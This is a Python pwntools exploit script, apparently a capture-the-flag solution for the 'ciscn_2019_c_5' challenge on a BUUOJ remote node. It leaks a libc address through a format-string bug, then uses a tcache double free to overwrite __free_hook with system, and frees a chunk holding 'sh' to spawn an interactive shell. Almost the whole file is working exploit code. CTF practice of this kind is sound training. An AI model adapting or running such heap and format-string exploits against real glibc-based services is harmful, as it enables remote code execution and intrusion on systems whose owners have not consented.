# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_2019_c_5'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28853'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,text):
    cmd(1)
    sla('size of story:',size)
    sla('inpute the story:',text)

def delete(idx):
    cmd(4)
    sla('index:',idx)

# one_gad = one_gadget(libc.path)

sla('name?' , '%p,%p')
# _printf_chk(1 , buf) 1代表了标准输出，这个函数也有格式化字符串洞

ru(',0x')
leak = rint() - 17

sa('ID.' , 'a')
# 同样可以 read 读如一个字节，让 put 输出栈上变量，低字节又不会变，所以也可泄露libc

libc.address = leak - libc.sym['read']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']

add(0x18 , '0')

delete(0)
delete(0)

add(0x18 , p64(__free_hook))
add(0x18 , 'a')
add(0x18 , p64(system))

add(0x28 , 'sh\x00')
delete(4)

# dbg()

p.interactive()

'''
@File    :   ciscn_2019_c_5.py
@Time    :   2021/08/27 18:11:18
@Author  :   Niyah 
'''